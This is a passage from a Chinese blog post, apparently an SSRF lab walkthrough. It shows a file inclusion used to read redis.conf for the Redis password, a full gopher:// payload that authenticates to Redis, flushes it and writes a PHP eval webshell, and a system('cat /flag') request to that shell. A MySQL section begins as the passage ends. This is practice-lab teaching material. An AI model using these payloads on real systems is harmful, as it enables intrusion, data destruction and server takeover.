+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251005162501399.png"
+width="341"
+height="56"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251005162501399_hu_ced6ebb79e6d734c.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251005162501399_hu_ce6c3c206f40415e.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="608"
+data-flex-basis="1461px"
+&gt;&lt;/p&gt;
+&lt;p&gt;最终得到flag：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;helloct{you_got_flag_27}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id="redis-有认证"&gt;Redis 有认证
+&lt;/h2&gt;&lt;h3 id="redis-auth-应用详情"&gt;Redis auth 应用详情
+&lt;/h3&gt;&lt;p&gt;该 172.72.23.28 主机运行着 Redis 服务，但是有密码验证，无法直接未授权执行命令：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251005163321309.png"
+width="378"
+height="107"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251005163321309_hu_5fc622139bc3f334.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251005163321309_hu_af79e50dea60391.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="353"
+data-flex-basis="847px"
+&gt;&lt;/p&gt;
+&lt;p&gt;不过除了 6379 端口还开放了 80 端口，观察后发现存在变量为file的文件包含：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251005163729959.png"
+width="1207"
+height="408"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251005163729959_hu_62d4b74682494817.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251005163729959_hu_940f1a64d5f6460f.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="295"
+data-flex-basis="710px"
+&gt;&lt;/p&gt;
+&lt;p&gt;因为 Redis 密码记录在 redis.conf 配置文件中，结合这个文件包含漏洞点，那么这时来尝试借助文件包含漏洞来读取 redis 的配置文件信息，Redis 常见的配置文件路径如下：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;span class="lnt"&gt;2
+&lt;/span&gt;&lt;span class="lnt"&gt;3
+&lt;/span&gt;&lt;span class="lnt"&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/etc/redis.conf
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/etc/redis/redis.conf
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/usr/local/redis/etc/redis.conf
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;/opt/redis/ect/redis.conf
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;成功读取到 &lt;code&gt;/etc/redis.conf&lt;/code&gt; 配置文件，直接搜索 &lt;code&gt;requirepass&lt;/code&gt; 关键词来定位寻找密码：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251005164037243.png"
+width="1216"
+height="543"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251005164037243_hu_f65076c532abae5d.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251005164037243_hu_f8d8181494a5262e.png 1024w"
+loading="lazy"
+alt="image-20251005164037243"
+class="gallery-image"
+data-flex-grow="223"
+data-flex-basis="537px"
+&gt;&lt;/p&gt;
+&lt;p&gt;拿到密码的话就可以正常和 Redis 进行交互了：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251005164219674.png"
+width="420"
+height="308"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251005164219674_hu_58d2a1497f616488.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251005164219674_hu_b60b59e8ab991f81.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="136"
+data-flex-basis="327px"
+&gt;&lt;/p&gt;
+&lt;h3 id="ssrf-之-redis-auth"&gt;SSRF 之 Redis auth
+&lt;/h3&gt;&lt;p&gt;首先借助目标系统的 80 端口上的文件包含拿到 Redis 的密码：P@ssw0rd&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251005164551833.png"
+width="1188"
+height="618"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251005164551833_hu_cea86e66e74d71ca.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251005164551833_hu_7f1e1ebee50b0ac7.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="192"
+data-flex-basis="461px"
+&gt;&lt;/p&gt;
+&lt;p&gt;有密码的话先使用 dict 协议进行密码认证看看：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251005170211687.png"
+width="835"
+height="288"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251005170211687_hu_e53bdf5d1d81bea4.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251005170211687_hu_7a8ce723e1e95538.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="289"
+data-flex-basis="695px"
+&gt;&lt;/p&gt;
+&lt;p&gt;但是因为 dict 不支持多行命令的原因，这样就导致认证后的参数无法执行，所以 dict 协议理论上来说是没发攻击带认证的 Redis 服务的。&lt;/p&gt;
+&lt;p&gt;那么就得使用gopher协议了，借助&lt;a class="link" href="https://github.com/LS95/gopher-redis-auth" target="_blank" rel="noopener"
+&gt;脚本&lt;/a&gt;生成payload：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251006003528364.png"
+width="729"
+height="500"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251006003528364_hu_a9591fa225637376.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251006003528364_hu_c2079f1680bf7c93.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="145"
+data-flex-basis="349px"
+&gt;&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-gdscript3" data-lang="gdscript3"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="n"&gt;gopher&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="o"&gt;//&lt;/span&gt;&lt;span class="mf"&gt;172.72&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="mf"&gt;23.28&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;6379&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;_&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="n"&gt;A2&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;244&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;AAUTH&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;248&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;AP&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;40&lt;/span&gt;&lt;span class="n"&gt;ssw0rd&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="n"&gt;A1&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;248&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;Aflushall&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="n"&gt;A3&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;243&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;Aset&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;241&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A1&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;2427&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="n"&gt;C&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="n"&gt;Fphp&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;20&lt;/span&gt;&lt;span class="n"&gt;eval&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;28&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;24&lt;/span&gt;&lt;span class="n"&gt;_GET&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="n"&gt;B1&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;29&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="n"&gt;B&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="n"&gt;F&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="n"&gt;E&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="n"&gt;A4&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;246&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;Aconfig&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;243&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;Aset&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;243&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;Adir&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;2413&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="k"&gt;var&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;www&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="n"&gt;html&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="n"&gt;A4&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;246&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;Aconfig&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;243&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;Aset&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;2410&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;Adbfilename&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;249&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;Ashell&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;php&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="n"&gt;A1&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;244&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;Asave&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="o"&gt;%&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;通过BP传入：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251006003947718.png"
+width="1194"
+height="684"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251006003947718_hu_bb2915e0d330e24f.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251006003947718_hu_a293a66d959384b1.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="174"
+data-flex-basis="418px"
+&gt;&lt;/p&gt;
+&lt;p&gt;验证shell创建成功：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251006004146923.png"
+width="1191"
+height="720"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251006004146923_hu_5499dc348506e7aa.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251006004146923_hu_553b51fec486cde7.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="165"
+data-flex-basis="397px"
+&gt;&lt;/p&gt;
+&lt;p&gt;最后通过&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;http://172.72.23.28/shell.php?1=system(&amp;#39;cat${IFS}/flag&amp;#39;);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;得到flag：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
+&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class="lntd"&gt;
+&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-fallback" data-lang="fallback"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;flag{7b992efb5ab23a3a3d5100e366c48423}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251006005315739.png"
+width="1202"
+height="661"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251006005315739_hu_a4e726dc383f39d3.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251006005315739_hu_bdb3c9d5194c781c.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="181"
+data-flex-basis="436px"
+&gt;&lt;/p&gt;
+&lt;h2 id="mysql-未授权"&gt;MySQL 未授权
+&lt;/h2&gt;&lt;h3 id="mysql-应用详情"&gt;MySQL 应用详情
+&lt;/h3&gt;&lt;p&gt;MySQL 空密码可以登录，通过 SSRF 可以和数据库进行交互，取得flag：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251006010605174.png"
+width="620"
+height="556"
+srcset="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251006010605174_hu_7a7602784a06ffac.png 480w, https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251006010605174_hu_e5ebb4f592f00613.png 1024w"
+loading="lazy"
+class="gallery-image"
+data-flex-grow="111"
+data-flex-basis="267px"
+&gt;&lt;/p&gt;
+&lt;h3 id="ssrf-之-mysql-未授权"&gt;SSRF 之 MySQL 未授权
+&lt;/h3&gt;&lt;p&gt;通过&lt;a class="link" href="https://github.com/tarunkant/Gopherus" target="_blank" rel="noopener"
+&gt;脚本&lt;/a&gt;生成payload：&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://pdzl.github.io/p/ssrf%E9%9D%B6%E5%9C%BA/image-20251006012807865.png"
+width="725"
+height="380"
